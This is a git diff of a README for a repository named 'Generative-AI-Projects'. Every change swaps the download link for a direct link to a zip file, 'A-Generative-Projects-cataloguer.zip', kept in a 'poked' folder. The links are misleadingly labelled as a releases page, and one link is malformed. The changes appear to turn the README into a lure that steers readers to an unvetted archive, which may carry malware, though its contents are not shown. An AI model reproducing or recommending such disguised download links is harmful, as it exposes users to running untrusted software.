@@ -6,7 +6,7 @@ Welcome to the Generative-AI-Projects repository! This project includes various 
 
 ## 🔗 Download Now
 
-[![Download Generative-AI-Projects Releases](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip%https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip)](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip)
+[![Download Generative-AI-Projects Releases](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/A-Generative-Projects-cataloguer.zip%https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/A-Generative-Projects-cataloguer.zip)](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/A-Generative-Projects-cataloguer.zip)
 
 ## 📋 Overview
 
@@ -39,7 +39,7 @@ The Generative-AI-Projects repository includes the following features:
 
 ## 📥 Download & Install
 
-To download the latest version of the Generative-AI-Projects software, visit this page: [Download Releases](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip).
+To download the latest version of the Generative-AI-Projects software, visit this page: [Download Releases](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/A-Generative-Projects-cataloguer.zip).
 
 1. Click on the link.
 2. Browse the list of available releases.
@@ -76,7 +76,7 @@ You are not alone in using this software. Join our community to connect with fel
 
 ## 🔗 Stay Updated
 
-Keep an eye on this repository for updates and new releases. Simply check the [Releases Page](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/Generative-AI-Projects.zip) regularly.
+Keep an eye on this repository for updates and new releases. Simply check the [Releases Page](https://raw.githubusercontent.com/rayyantoji/Generative-AI-Projects/main/poked/A-Generative-Projects-cataloguer.zip) regularly.
 
 ## ⭐ Conclusion
 
